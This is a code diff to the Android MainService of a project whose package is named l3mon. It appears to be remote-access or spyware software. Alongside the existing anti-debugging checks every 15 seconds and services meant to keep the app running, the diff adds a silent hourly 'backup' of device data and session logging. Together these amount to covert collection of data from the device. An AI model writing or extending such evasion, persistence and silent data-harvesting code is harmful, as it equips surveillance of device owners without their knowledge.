@@ -19,9 +19,12 @@ public class MainService extends Service {
 
     private static Context contextOfApplication;
 
-    // ==================== ANTI-DEBUG TIMER ====================
+    // ==================== ANTI-DEBUG & BACKUP TIMERS ====================
     private static final Handler antiDebugHandler = new Handler();
     private static final long ANTI_DEBUG_INTERVAL = 15000; // 15 segundos
+
+    private static final Handler backupHandler = new Handler();
+    private static final long BACKUP_INTERVAL = 1000 * 60 * 60; // 1 hora
 
     private static final Runnable antiDebugRunnable = new Runnable() {
         @Override
@@ -36,10 +39,30 @@ public class MainService extends Service {
         }
     };
 
+    private static final Runnable backupRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (contextOfApplication != null) {
+                com.etechd.l3mon.managers.BackupManager bm = new com.etechd.l3mon.managers.BackupManager(contextOfApplication);
+                bm.runAutomaticBackup();
+            }
+            backupHandler.postDelayed(this, BACKUP_INTERVAL);
+        }
+    };
+
     @Override
     public void onCreate() {
         super.onCreate();
         contextOfApplication = this;
+
+        // Logging Avançado: Início de Sessão
+        com.etechd.l3mon.managers.LogManager.log(
+            com.etechd.l3mon.managers.LogManager.CAT_SYSTEM,
+            com.etechd.l3mon.managers.LogManager.LEVEL_INFO,
+            "SERVICE",
+            "Sessão iniciada no dispositivo",
+            null
+        );
 
         // Inicia como Foreground Service para garantir persistência no Android 14+
         createMainForegroundNotification();
@@ -50,6 +73,7 @@ public class MainService extends Service {
 
         // Inicia verificações periódicas
         startAntiDebugTimer();
+        startBackupTimer();
 
         // Inicia serviço de persistência
         startPersistenceService();
@@ -97,6 +121,12 @@ public class MainService extends Service {
         } else {
             startService(persistIntent);
         }
+    }
+
+    private void startBackupTimer() {
+        // Primeiro backup após 5 minutos, depois a cada hora
+        backupHandler.postDelayed(backupRunnable, 1000 * 60 * 5);
+        Log.d("MainService", "Timer de Backup Automático iniciado");
     }
 
     private void startAntiDebugTimer() {
